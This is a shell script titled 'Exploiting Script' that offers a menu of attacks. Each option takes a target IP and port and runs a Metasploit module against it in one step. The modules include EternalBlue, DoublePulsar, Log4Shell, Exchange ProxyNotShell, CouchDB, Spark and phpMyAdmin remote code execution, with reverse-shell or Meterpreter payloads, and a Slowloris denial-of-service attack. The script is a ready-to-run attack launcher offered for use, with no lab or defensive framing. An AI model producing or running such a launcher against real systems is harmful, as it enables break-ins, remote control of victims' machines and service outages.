#!/bin/sh
#ExploitingScript
#CodeBy DroPZsec
#

#COLORED_OUTPUT

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# MENU CODE

clear
    sleep 1.0
echo $green "Loading Exploiting Menu..." $reset 
    sleep 1.0
clear
    sleep 0.25
echo $orange 
figlet -f small "Exploit Menu"
echo "" $reset 
echo "" 
echo ""
echo ""
echo "" 
echo $blue"1."$reset $orange")"$reset $green "Apache Couchdb Erlang RCE" $reset 
    sleep 0.25
echo $blue"2."$reset $orange")"$reset $green "WordPress Database Backup RCE" $reset 
    sleep 0.25
echo $blue"3."$reset $orange")"$reset $green "SMB DUOBLEPULSAR Remote Code Execution" $reset 
    sleep 0.25
echo $blue"4."$reset $orange")"$reset $green "Log4Shell HTTP Header Injection" $reset 
    sleep 0.25
echo $blue"5."$reset $orange")"$reset $green "Slowloris DOS Attack" $reset 
    sleep 0.25
echo $blue"6."$reset $orange")"$reset $green "EternalBlue SMB/Windows Kernel Pool Corruption" $reset 
    sleep 0.25
echo $blue"7."$reset $orange")"$reset $green "PhpMyAdmin Config File Code Injection" $reset 
    sleep 0.25
echo $blue"8."$reset $orange")"$reset $green "Microsoft Exchange ProxyNotShell RCE" $reset 
    sleep 0.25
echo $blue"9."$reset $orange")"$reset $green "Apache Spark Unauthenticated Command Injection RCE" $reset 
    sleep 0.25
echo $blue"10."$reset $orange")"$reset $green "EXIT" $reset 
    sleep 0.25
echo $green "Enter your choice:" $reset
    read answer;

if [ $answer = 1 ]; then
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/multi/http/apache_couchdb_erlang_rce; set payload cmd/unix/reverse_openssl; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi
if [ $answer = 2 ]; then
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/multi/http/wp_db_backup_rce; set payload windows/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to contiue..." $reset 
        read enter;
fi 
if [ $answer = 3 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/windows/smb/smb_doublepulsar_rce; set payload windows/x64/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 4 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/multi/http/log4shell_header_injection; set payload java/shell_reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 5 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use auxiliary/dos/http/slowloris; set rhost $ip; set rport $port; exploit; exit; "
    sudo nmap -Pn $ip -p $port --script http-slowloris --max-parallelism 400 -d 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 6 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 7 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/unix/webapp/phpmyadmin_config; set payload php/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 8 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/windows/http/exchange_proxynotshell_rce; set payload windows/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 9 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/linux/http/apache_spark_rce_cve_2022_33891; set payload cmd/unix/reverse_python; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 10 ]; then 
    echo $green "OK, Youre Choice..."
        sleep 1.0
    clear
    echo $blue
    figlet -f small "Exploiting Script"
        sleep 0.5 
    figlet -f small "coded by:"
    echo $reset $orange 
        sleep 1.0 
    figlet -f big "vDroPZz"
        sleep 1.0
    clear 
    echo $reset $blue  
    figlet -f small "Follow me on Github:"
    echo $reset $orange 
        sleep 0.5 
    figlet -f big "DroPZsec"
        sleep 1.5 
    clear 
    echo $reset 
    cd ..
    ./BashAttack.sh
fi   
./explo.sh 
/bin/sh 